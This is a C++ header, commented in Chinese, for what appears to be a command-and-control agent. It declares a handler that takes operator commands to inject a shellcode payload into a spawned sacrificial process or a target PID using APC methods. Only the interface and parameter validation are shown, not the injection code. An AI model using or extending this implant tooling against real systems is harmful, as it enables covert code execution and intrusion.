/**
 * @file InjectHandler.hpp
 * @brief InjectExec: 远程命令驱动的注入器(混合帧: JSON 头 = 参数, 帧尾 = 载荷)
 * @details
 * 帧二进制体 = 载荷 blob(第 0 字节 = 入口, 仓库硬约定, MigrateSpawn/ModuleLoad/BofExec
 * 同款先例)。裸 PE 不在 v1 契约内 —— 操作员侧先转 shc(Tools/ShellcodeLoader/tools/
 * dll2shc.py), Agent 不嗅探字节。
 *
 * params:
 *   method       必填, 方法名(注册表键, snake_case: spawn_apc / pid_apc)
 *   target_kind  必填, "spawn" | "pid"
 *   target       必填, spawn = 牺牲进程镜像完整路径(string); pid = 目标 PID(number)
 *   payload_kind 可选, 默认 "blob"
 *
 * 编排 = 按名查表 + 声明校验: 方法不存在 / payload_kind 或 target_kind 不在方法
 * 声明支持面 → 明确拒绝(Packet::Error); 匹配则调 method->Inject, 失败回 0x 原始码
 * (MigrateSpawn 现样)。目标与载荷的选择是操作员的判断, Agent 不解析进程名、
 * 不猜内容。
 */
#pragma once

#include "Core/Command/Handlers/IHandler.hpp"

namespace cleat {

    class InjectHandler : public IHandler {
    public:
        nlohmann::json Execute(const CommandRequest& req) override;

        /// MakeProcessKey, 同 PID 自动互斥; spawn 模式每次新建牺牲进程, 无共享资源
        /// → 空 key(不参与互斥)
        /// 注: JSON 里操作员下发的整数字面量经 nlohmann 存为 number_integer
        /// (int 构造路径), 不用 is_number_unsigned 判 —— 那会把 777 误判非数。
        ResourceKey ResourceOf(const CommandRequest& req) const override {
            const auto itKind = req.params.find("target_kind");
            if (itKind == req.params.end() || !itKind->is_string()
                || itKind->get<std::string>() != "pid") {
                return ResourceKey{};
            }
            const auto it = req.params.find("target");
            return (it != req.params.end() && it->is_number_integer()
                    && it->get<long long>() > 0)
                ? MakeProcessKey(static_cast<unsigned long>(it->get<long long>()))
                : ResourceKey{};
        }
    };

} // namespace cleat
